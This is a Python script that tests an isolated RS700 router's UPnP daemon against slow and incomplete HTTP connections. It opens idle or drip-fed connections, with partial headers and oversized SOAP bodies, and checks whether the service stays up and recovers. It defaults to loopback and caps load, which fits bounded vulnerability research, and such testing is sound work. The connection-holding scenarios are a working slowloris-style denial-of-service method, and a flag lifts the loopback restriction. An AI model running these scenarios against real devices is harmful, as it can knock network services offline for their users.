#!/usr/bin/env python3
"""Bounded slow/incomplete-connection availability probe for isolated RS700 upnpd."""

from __future__ import annotations

import argparse
import ipaddress
import json
import socket
import time
from dataclasses import dataclass


DESCRIPTION = "/Public_UPNP_gatedesc.xml"
SOAP_PATH = "/Public_UPNP_C3"


@dataclass(frozen=True)
class Scenario:
    name: str
    prefix: bytes
    drip: bytes = b""


SCENARIOS = (
    Scenario("idle_connection", b""),
    Scenario(
        "partial_request_headers",
        b"POST /Public_UPNP_C3 HTTP/1.1\r\n"
        b"Host: 192.168.1.1:56688\r\n"
        b"Content-Type: text/xml\r\n",
    ),
    Scenario(
        "incomplete_soap_body",
        b"POST /Public_UPNP_C3 HTTP/1.1\r\n"
        b"Host: 192.168.1.1:56688\r\n"
        b"Content-Type: text/xml\r\n"
        b'SOAPAction: "urn:schemas-upnp-org:service:'
        b'WANIPConnection:1#GetExternalIPAddress"\r\n'
        b"Content-Length: 1048576\r\n\r\n"
        b"<",
    ),
    Scenario(
        "slow_header_drip",
        b"POST /Public_UPNP_C3 HTTP/1.1\r\n"
        b"Host: 192.168.1.1:56688\r\n"
        b"X-RS700-Probe: ",
        b"A",
    ),
    Scenario(
        "slow_body_drip",
        b"POST /Public_UPNP_C3 HTTP/1.1\r\n"
        b"Host: 192.168.1.1:56688\r\n"
        b"Content-Type: text/xml\r\n"
        b"Content-Length: 1048576\r\n\r\n",
        b"A",
    ),
)


def health(host: str, port: int, timeout: float) -> dict[str, object]:
    payload = (
        f"GET {DESCRIPTION} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\nConnection: close\r\n\r\n"
    ).encode()
    result: dict[str, object] = {}
    started = time.monotonic()
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(payload)
            response = sock.recv(256)
        result["status_line"] = response.splitlines()[0].decode("latin-1", "replace")
    except OSError as error:
        result["error"] = f"{type(error).__name__}: {error}"
    result["elapsed_ms"] = round((time.monotonic() - started) * 1000)
    return result


def open_held(host: str, port: int, scenario: Scenario, count: int) -> list[socket.socket]:
    sockets: list[socket.socket] = []
    for _ in range(count):
        sock = socket.create_connection((host, port), timeout=1.0)
        sock.settimeout(1.0)
        if scenario.prefix:
            sock.sendall(scenario.prefix)
        sockets.append(sock)
    return sockets


def close_all(sockets: list[socket.socket]) -> None:
    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass


def wait_for_recovery(host: str, port: int, timeout: float) -> dict[str, object]:
    attempts = []
    for _ in range(10):
        outcome = health(host, port, timeout)
        attempts.append(outcome)
        if outcome.get("status_line") == "HTTP/1.1 200 OK":
            return {"recovered": True, "attempts": attempts}
        time.sleep(0.2)
    return {"recovered": False, "attempts": attempts}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=56688)
    parser.add_argument("--timeout", type=float, default=1.5)
    parser.add_argument("--hold-seconds", type=float, default=2.0)
    parser.add_argument("--trials", type=int, default=3)
    parser.add_argument("--max-connections", type=int, default=8)
    parser.add_argument("--connections", type=int)
    parser.add_argument(
        "--scenario",
        choices=("all", *(scenario.name for scenario in SCENARIOS)),
        default="all",
    )
    parser.add_argument("--allow-non-loopback", action="store_true")
    args = parser.parse_args()

    address = ipaddress.ip_address(socket.gethostbyname(args.host))
    if not address.is_loopback and not args.allow_non_loopback:
        parser.error("non-loopback target refused; use only inside an isolated lab")
    if not 1 <= args.max_connections <= 32:
        parser.error("max-connections must be between 1 and 32")
    if args.connections is not None and not 1 <= args.connections <= 32:
        parser.error("connections must be between 1 and 32")
    if not 0.1 <= args.hold_seconds <= 10:
        parser.error("hold-seconds must be between 0.1 and 10")
    if not 1 <= args.trials <= 5:
        parser.error("trials must be between 1 and 5")

    initial = health(args.host, args.port, args.timeout)
    print(json.dumps({"event": "initial_health", **initial}, sort_keys=True), flush=True)
    if initial.get("status_line") != "HTTP/1.1 200 OK":
        return 2

    levels = (
        [args.connections]
        if args.connections is not None
        else sorted({1, min(4, args.max_connections), args.max_connections})
    )
    selected = (
        SCENARIOS
        if args.scenario == "all"
        else tuple(scenario for scenario in SCENARIOS if scenario.name == args.scenario)
    )
    for scenario in selected:
        single_connection_blocked = False
        for count in levels:
            for trial in range(1, args.trials + 1):
                held: list[socket.socket] = []
                record: dict[str, object] = {
                    "event": "trial",
                    "scenario": scenario.name,
                    "connections": count,
                    "trial": trial,
                }
                try:
                    held = open_held(args.host, args.port, scenario, count)
                    record["opened"] = len(held)
                    time.sleep(min(args.hold_seconds, 0.5))
                    record["health_while_held"] = health(args.host, args.port, args.timeout)
                    remaining = max(0.0, args.hold_seconds - min(args.hold_seconds, 0.5))
                    if remaining:
                        deadline = time.monotonic() + remaining
                        while time.monotonic() < deadline:
                            delay = min(0.75, max(0.0, deadline - time.monotonic()))
                            time.sleep(delay)
                            if scenario.drip and time.monotonic() < deadline:
                                for sock in held:
                                    sock.sendall(scenario.drip)
                        record["health_near_release"] = health(args.host, args.port, args.timeout)
                except OSError as error:
                    record["open_error"] = f"{type(error).__name__}: {error}"
                finally:
                    close_all(held)
                record["recovery"] = wait_for_recovery(args.host, args.port, args.timeout)
                print(json.dumps(record, sort_keys=True), flush=True)
                if not record["recovery"]["recovered"]:  # type: ignore[index]
                    return 3
                while_held = record.get("health_while_held", {})
                if count == 1 and not while_held.get("status_line"):  # type: ignore[union-attr]
                    single_connection_blocked = True
            # Three trials at one connection are enough to establish the
            # single-client blocking condition; do not add unnecessary load.
            if args.connections is None and count == 1 and single_connection_blocked:
                break
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
